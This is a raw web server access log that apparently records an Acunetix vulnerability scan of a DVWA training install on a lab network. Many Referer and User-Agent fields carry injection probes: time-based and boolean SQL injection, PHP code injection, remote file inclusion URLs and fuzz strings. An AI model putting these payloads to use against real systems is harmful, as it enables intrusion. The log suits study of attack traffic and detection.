192.168.220.131 - - [03/Dec/2017:03:25:59 -0500] "GET /dvwa/dvwa/images/ HTTP/1.1" 200 2048 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21"
192.168.220.131 - - [03/Dec/2017:03:25:59 -0500] "GET /dvwa/dvwa/images/ HTTP/1.1" 200 2048 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21"
192.168.220.131 - - [03/Dec/2017:03:25:59 -0500] "GET /dvwa/dvwa/images/ HTTP/1.1" 200 2048 "http://192.168.220.128/dvwa/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21"
192.168.220.131 - - [03/Dec/2017:03:25:59 -0500] "GET /dvwa/dvwa/images/ HTTP/1.1" 200 2048 "http://192.168.220.128/dvwa/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21"
192.168.220.131 - - [03/Dec/2017:03:25:59 -0500] "GET /dvwa/dvwa/css/ HTTP/1.1" 200 1452 "http://192.168.220.128/dvwa/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21"
192.168.220.131 - - [03/Dec/2017:03:25:59 -0500] "GET /dvwa/dvwa/images/ HTTP/1.1" 200 2048 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21"
192.168.220.131 - - [03/Dec/2017:03:25:59 -0500] "GET /dvwa/dvwa/images/ HTTP/1.1" 200 2048 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21"
192.168.220.131 - - [03/Dec/2017:03:25:59 -0500] "GET /dvwa/dvwa/css/ HTTP/1.1" 200 1452 "http://192.168.220.128/dvwa/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21"
192.168.220.131 - - [03/Dec/2017:03:25:59 -0500] "GET /dvwa/dvwa/css/ HTTP/1.1" 200 1452 "http://192.168.220.128/dvwa/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21"
192.168.220.131 - - [03/Dec/2017:03:25:59 -0500] "GET /dvwa/dvwa/images/ HTTP/1.1" 200 2048 "http://some-inexistent-website.acu/some_inexistent_file_with_long_name%3F.jpg" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21"
192.168.220.131 - - [03/Dec/2017:03:25:59 -0500] "GET /dvwa/dvwa/images/ HTTP/1.1" 200 2048 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21"
192.168.220.131 - - [03/Dec/2017:03:25:59 -0500] "GET /dvwa/dvwa/images/ HTTP/1.1" 200 2048 "1some_inexistent_file_with_long_name%00.jpg" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21"
192.168.220.131 - - [03/Dec/2017:03:25:59 -0500] "GET /dvwa/dvwa/images/ HTTP/1.1" 200 2048 "http://192.168.220.128/dvwa/" "xKbsRepD"
192.168.220.131 - - [03/Dec/2017:03:25:59 -0500] "GET /dvwa/dvwa/css/ HTTP/1.1" 200 1452 "http://192.168.220.128/dvwa/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21"
192.168.220.131 - - [03/Dec/2017:03:25:59 -0500] "GET /dvwa/dvwa/images/ HTTP/1.1" 200 2048 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21"
192.168.220.131 - - [03/Dec/2017:03:25:59 -0500] "GET /dvwa/dvwa/css/ HTTP/1.1" 200 1452 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21"
192.168.220.131 - - [03/Dec/2017:03:25:59 -0500] "GET /dvwa/dvwa/images/ HTTP/1.1" 200 2048 "Http://testasp.vulnweb.com/t/fit.txt" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21"
192.168.220.131 - - [03/Dec/2017:03:25:59 -0500] "GET /dvwa/dvwa/css/ HTTP/1.1" 200 1452 "http://192.168.220.128/dvwa/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21"
192.168.220.131 - - [03/Dec/2017:03:25:59 -0500] "GET /dvwa/dvwa/images/ HTTP/1.1" 200 2048 "http://192.168.220.128/dvwa/" "-1 OR 2+920-920-1=0+0+0+1 --"
192.168.220.131 - - [03/Dec/2017:03:25:59 -0500] "GET /dvwa/dvwa/css/ HTTP/1.1" 200 1452 "http://192.168.220.128/dvwa/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21"
192.168.220.131 - - [03/Dec/2017:03:25:59 -0500] "GET /dvwa/dvwa/images/ HTTP/1.1" 200 2048 "http://192.168.220.128/dvwa/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21"
192.168.220.131 - - [03/Dec/2017:03:25:59 -0500] "GET /dvwa/dvwa/images/ HTTP/1.1" 200 2048 "http://192.168.220.128/dvwa/" "-1 OR 2+607-607-1=0+0+0+1"
192.168.220.131 - - [03/Dec/2017:03:25:59 -0500] "GET /dvwa/dvwa/css/ HTTP/1.1" 200 1452 "http://192.168.220.128/dvwa/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21"
192.168.220.131 - - [03/Dec/2017:03:25:59 -0500] "GET /dvwa/dvwa/css/ HTTP/1.1" 200 1452 "http://192.168.220.128/dvwa/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21"
192.168.220.131 - - [03/Dec/2017:03:25:59 -0500] "GET /dvwa/dvwa/images/ HTTP/1.1" 200 2048 "http://testasp.vulnweb.com/t/fit.txt%3F.jpg" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21"
192.168.220.131 - - [03/Dec/2017:03:25:59 -0500] "GET /dvwa/dvwa/images/ HTTP/1.1" 200 2048 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21"
192.168.220.131 - - [03/Dec/2017:03:25:59 -0500] "GET /dvwa/dvwa/images/ HTTP/1.1" 200 2048 "http://192.168.220.128/dvwa/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21"
192.168.220.131 - - [03/Dec/2017:03:25:59 -0500] "GET /dvwa/ HTTP/1.1" 302 - "http://192.168.220.128/dvwa/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21"
192.168.220.131 - - [03/Dec/2017:03:25:59 -0500] "GET /dvwa/login.php HTTP/1.1" 200 1289 "http://192.168.220.128/dvwa/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21"
192.168.220.131 - - [03/Dec/2017:03:25:59 -0500] "GET /dvwa/dvwa/images/ HTTP/1.1" 200 2048 "http://192.168.220.128/dvwa/" "-1' OR 2+808-808-1=0+0+0+1 --"
192.168.220.131 - - [03/Dec/2017:03:25:59 -0500] "GET /dvwa/login.php HTTP/1.1" 200 1289 "http://192.168.220.128/dvwa/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21"
192.168.220.131 - - [03/Dec/2017:03:25:59 -0500] "GET /dvwa/dvwa/images/ HTTP/1.1" 200 2048 "http://192.168.220.128/dvwa/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21"
192.168.220.131 - - [03/Dec/2017:03:25:59 -0500] "GET /dvwa/dvwa/css/ HTTP/1.1" 200 1452 "http://192.168.220.128/dvwa/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21"
192.168.220.131 - - [03/Dec/2017:03:25:59 -0500] "GET /dvwa/dvwa/images/ HTTP/1.1" 200 2048 "http://192.168.220.128/dvwa/" "-1' OR 2+710-710-1=0+0+0+1 or '1Cax8RqD'='"
192.168.220.131 - - [03/Dec/2017:03:25:59 -0500] "GET /dvwa/dvwa/images/ HTTP/1.1" 200 2048 "testasp.vulnweb.com" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21"
192.168.220.131 - - [03/Dec/2017:03:25:59 -0500] "GET /dvwa/dvwa/css/ HTTP/1.1" 200 1452 "http://192.168.220.128/dvwa/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21"
192.168.220.131 - - [03/Dec/2017:03:25:59 -0500] "GET /dvwa/dvwa/images/ HTTP/1.1" 200 2048 "http://192.168.220.128/dvwa/" "-1\" OR 2+654-654-1=0+0+0+1 --"
192.168.220.131 - - [03/Dec/2017:03:25:59 -0500] "GET /dvwa/dvwa/css/ HTTP/1.1" 200 1452 "http://192.168.220.128/dvwa/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21"
192.168.220.131 - - [03/Dec/2017:03:25:59 -0500] "GET /dvwa/dvwa/images/ HTTP/1.1" 200 2048 "http://192.168.220.128/dvwa/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21"
192.168.220.131 - - [03/Dec/2017:03:25:59 -0500] "GET /dvwa/dvwa/images/ HTTP/1.1" 200 2048 "http://192.168.220.128/dvwa/" "http://some-inexistent-website.acu/some_inexistent_file_with_long_name%3F.21"
192.168.220.131 - - [03/Dec/2017:03:25:59 -0500] "GET /dvwa/dvwa/images/ HTTP/1.1" 200 2048 "http://192.168.220.128/dvwa/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21"
192.168.220.131 - - [03/Dec/2017:03:25:59 -0500] "GET /dvwa/dvwa/css/ HTTP/1.1" 200 1452 "http://192.168.220.128/dvwa/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21"
192.168.220.131 - - [03/Dec/2017:03:25:59 -0500] "GET /dvwa/dvwa/css/ HTTP/1.1" 200 1452 "http://192.168.220.128/dvwa/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21"
192.168.220.131 - - [03/Dec/2017:03:25:59 -0500] "GET /dvwa/dvwa/images/ HTTP/1.1" 200 2048 ")" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21"
192.168.220.131 - - [03/Dec/2017:03:25:59 -0500] "GET /dvwa/dvwa/images/ HTTP/1.1" 200 2048 "http://192.168.220.128/dvwa/" "1some_inexistent_file_with_long_name%00.21"
192.168.220.131 - - [03/Dec/2017:03:25:59 -0500] "GET /dvwa/dvwa/images/ HTTP/1.1" 200 2048 "http://192.168.220.128/dvwa/" "if(now()=sysdate(),sleep(2),0)/*'XOR(if(now()=sysdate(),sleep(2),0))OR'\"XOR(if(now()=sysdate(),sleep(2),0))OR\"*/"
192.168.220.131 - - [03/Dec/2017:03:25:59 -0500] "GET /dvwa/login.php HTTP/1.1" 200 1289 "http://192.168.220.128/dvwa/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21"
192.168.220.131 - - [03/Dec/2017:03:25:59 -0500] "GET /dvwa/login.php HTTP/1.1" 200 1289 "http://192.168.220.128/dvwa/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21"
192.168.220.131 - - [03/Dec/2017:03:25:59 -0500] "GET /dvwa/ HTTP/1.1" 302 - "http://192.168.220.128/dvwa/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21"
192.168.220.131 - - [03/Dec/2017:03:25:59 -0500] "GET /dvwa/dvwa/css/ HTTP/1.1" 200 1452 "http://192.168.220.128/dvwa/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21"
192.168.220.131 - - [03/Dec/2017:03:25:59 -0500] "GET /dvwa/dvwa/images/ HTTP/1.1" 200 2048 "http://192.168.220.128/dvwa/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21"
192.168.220.131 - - [03/Dec/2017:03:25:59 -0500] "GET /dvwa/dvwa/css/ HTTP/1.1" 200 1452 "http://192.168.220.128/dvwa/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21"
192.168.220.131 - - [03/Dec/2017:03:25:59 -0500] "GET /dvwa/dvwa/images/ HTTP/1.1" 200 2048 "http://192.168.220.128/dvwa/" "Http://testasp.vulnweb.com/t/fit.txt"
192.168.220.131 - - [03/Dec/2017:03:25:59 -0500] "GET /dvwa/dvwa/css/ HTTP/1.1" 200 1452 "http://192.168.220.128/dvwa/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21"
192.168.220.131 - - [03/Dec/2017:03:25:59 -0500] "GET /dvwa/dvwa/images/ HTTP/1.1" 200 2048 "http://192.168.220.128/dvwa/" "(select(0)from(select(sleep(4)))v)/*'+(select(0)from(select(sleep(4)))v)+'\"+(select(0)from(select(sleep(4)))v)+\"*/"
192.168.220.131 - - [03/Dec/2017:03:25:59 -0500] "GET /dvwa/dvwa/css/ HTTP/1.1" 200 1452 "http://192.168.220.128/dvwa/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21"
192.168.220.131 - - [03/Dec/2017:03:25:59 -0500] "GET /dvwa/dvwa/images/ HTTP/1.1" 200 2048 "http://192.168.220.128/dvwa/" "http://testasp.vulnweb.com/t/fit.txt%3F.21"
192.168.220.131 - - [03/Dec/2017:03:25:59 -0500] "GET /dvwa/dvwa/images/ HTTP/1.1" 200 2048 "http://192.168.220.128/dvwa/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21"
192.168.220.131 - - [03/Dec/2017:03:25:59 -0500] "GET /dvwa/dvwa/images/ HTTP/1.1" 200 2048 "!(()&&!|*|*|" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21"
192.168.220.131 - - [03/Dec/2017:03:25:59 -0500] "GET /dvwa/login.php HTTP/1.1" 200 1289 "http://192.168.220.128/dvwa/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21"
192.168.220.131 - - [03/Dec/2017:03:25:59 -0500] "GET /dvwa/ HTTP/1.1" 302 - "http://192.168.220.128/dvwa/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21"
192.168.220.131 - - [03/Dec/2017:03:25:59 -0500] "GET /dvwa/login.php HTTP/1.1" 200 1289 "http://192.168.220.128/dvwa/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21"
192.168.220.131 - - [03/Dec/2017:03:25:59 -0500] "GET /dvwa/dvwa/css/ HTTP/1.1" 200 1452 "http://192.168.220.128/dvwa/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21"
192.168.220.131 - - [03/Dec/2017:03:25:59 -0500] "GET /dvwa/dvwa/images/ HTTP/1.1" 200 2048 "http://192.168.220.128/dvwa/" "1 waitfor delay '0:0:4' --"
192.168.220.131 - - [03/Dec/2017:03:25:59 -0500] "GET /dvwa/dvwa/css/ HTTP/1.1" 200 1452 "http://192.168.220.128/dvwa/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21"
192.168.220.131 - - [03/Dec/2017:03:25:59 -0500] "GET /dvwa/dvwa/images/ HTTP/1.1" 200 2048 "http://192.168.220.128/dvwa/" "testasp.vulnweb.com"
192.168.220.131 - - [03/Dec/2017:03:26:00 -0500] "GET /dvwa/dvwa/images/ HTTP/1.1" 200 2048 "http://192.168.220.128/dvwa/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21"
192.168.220.131 - - [03/Dec/2017:03:26:00 -0500] "GET /dvwa/dvwa/images/ HTTP/1.1" 200 2048 "^(#$!@#$)(()))******" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21"
192.168.220.131 - - [03/Dec/2017:03:25:59 -0500] "GET /dvwa/login.php HTTP/1.1" 200 1289 "http://192.168.220.128/dvwa/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21"
192.168.220.131 - - [03/Dec/2017:03:26:00 -0500] "GET /dvwa/ HTTP/1.1" 302 - "http://192.168.220.128/dvwa/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21"
192.168.220.131 - - [03/Dec/2017:03:26:00 -0500] "GET /dvwa/login.php HTTP/1.1" 200 1289 "http://192.168.220.128/dvwa/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21"
192.168.220.131 - - [03/Dec/2017:03:26:00 -0500] "GET /dvwa/dvwa/css/ HTTP/1.1" 200 1452 "http://192.168.220.128/dvwa/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21"
192.168.220.131 - - [03/Dec/2017:03:26:00 -0500] "GET /dvwa/dvwa/images/ HTTP/1.1" 200 2048 "http://192.168.220.128/dvwa/" ")"
192.168.220.131 - - [03/Dec/2017:03:26:00 -0500] "GET /dvwa/dvwa/images/ HTTP/1.1" 200 2048 ";print(md5(acunetix_wvs_security_test));" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21"
192.168.220.131 - - [03/Dec/2017:03:26:00 -0500] "GET /dvwa/dvwa/css/ HTTP/1.1" 200 1452 "http://192.168.220.128/dvwa/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21"
192.168.220.131 - - [03/Dec/2017:03:26:00 -0500] "GET /dvwa/dvwa/css/ HTTP/1.1" 200 1452 "http://192.168.220.128/dvwa/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21"
192.168.220.131 - - [03/Dec/2017:03:26:00 -0500] "GET /dvwa/dvwa/images/ HTTP/1.1" 200 2048 "http://192.168.220.128/dvwa/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21"
192.168.220.131 - - [03/Dec/2017:03:26:00 -0500] "GET /dvwa/dvwa/images/ HTTP/1.1" 200 2048 "http://192.168.220.128/dvwa/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21"
192.168.220.131 - - [03/Dec/2017:03:26:00 -0500] "GET /dvwa/dvwa/images/ HTTP/1.1" 200 2048 "http://192.168.220.128/dvwa/" "!(()&&!|*|*|"
192.168.220.131 - - [03/Dec/2017:03:26:00 -0500] "GET /dvwa/dvwa/images/ HTTP/1.1" 200 2048 "http://192.168.220.128/dvwa/" "fv7cvvhM'; waitfor delay '0:0:4' --"
192.168.220.131 - - [03/Dec/2017:03:26:00 -0500] "GET /dvwa/dvwa/images/ HTTP/1.1" 200 2048 "';print(md5(acunetix_wvs_security_test));$a='" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21"
192.168.220.131 - - [03/Dec/2017:03:26:00 -0500] "GET /dvwa/login.php HTTP/1.1" 200 1289 "http://192.168.220.128/dvwa/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21"
192.168.220.131 - - [03/Dec/2017:03:26:00 -0500] "GET /dvwa/login.php HTTP/1.1" 200 1289 "http://192.168.220.128/dvwa/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21"
192.168.220.131 - - [03/Dec/2017:03:26:00 -0500] "GET /dvwa/ HTTP/1.1" 302 - "http://192.168.220.128/dvwa/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21"
192.168.220.131 - - [03/Dec/2017:03:26:00 -0500] "GET /dvwa/dvwa/css/ HTTP/1.1" 200 1452 "http://192.168.220.128/dvwa/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21"
192.168.220.131 - - [03/Dec/2017:03:26:00 -0500] "GET /dvwa/dvwa/css/ HTTP/1.1" 200 1452 "http://192.168.220.128/dvwa/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21"
192.168.220.131 - - [03/Dec/2017:03:26:00 -0500] "GET /dvwa/dvwa/images/ HTTP/1.1" 200 2048 "http://testasp.vulnweb.com/t/xss.html?%00.jpg" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21"
192.168.220.131 - - [03/Dec/2017:03:26:00 -0500] "GET /dvwa/dvwa/images/ HTTP/1.1" 200 2048 "\";print(md5(acunetix_wvs_security_test));$a=\"" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21"
192.168.220.131 - - [03/Dec/2017:03:26:00 -0500] "GET /dvwa/dvwa/images/ HTTP/1.1" 200 2048 "http://192.168.220.128/dvwa/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21"
192.168.220.131 - - [03/Dec/2017:03:26:00 -0500] "GET /dvwa/dvwa/css/ HTTP/1.1" 200 1452 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21"
192.168.220.131 - - [03/Dec/2017:03:26:00 -0500] "GET /dvwa/dvwa/images/ HTTP/1.1" 200 2048 "http://192.168.220.128/dvwa/" "^(#$!@#$)(()))******"
192.168.220.131 - - [03/Dec/2017:03:26:00 -0500] "GET /dvwa/dvwa/images/ HTTP/1.1" 200 2048 "http://192.168.220.128/dvwa/" "IiGWJoXM';select pg_sleep(6); --"
192.168.220.131 - - [03/Dec/2017:03:26:00 -0500] "GET /dvwa/dvwa/css/ HTTP/1.1" 200 1452 "http://192.168.220.128/dvwa/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21"
192.168.220.131 - - [03/Dec/2017:03:26:00 -0500] "GET /dvwa/dvwa/css/ HTTP/1.1" 200 1452 "http://192.168.220.128/dvwa/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21"
192.168.220.131 - - [03/Dec/2017:03:26:00 -0500] "GET /dvwa/dvwa/images/ HTTP/1.1" 200 2048 "http://192.168.220.128/dvwa/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21"
192.168.220.131 - - [03/Dec/2017:03:26:00 -0500] "GET /dvwa/ HTTP/1.1" 302 - "http://192.168.220.128/dvwa/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21"
192.168.220.131 - - [03/Dec/2017:03:26:00 -0500] "GET /dvwa/dvwa/images/ HTTP/1.1" 200 2048 "http://192.168.220.128/dvwa/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21"
192.168.220.131 - - [03/Dec/2017:03:26:00 -0500] "GET /dvwa/login.php HTTP/1.1" 200 1289 "http://192.168.220.128/dvwa/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21"
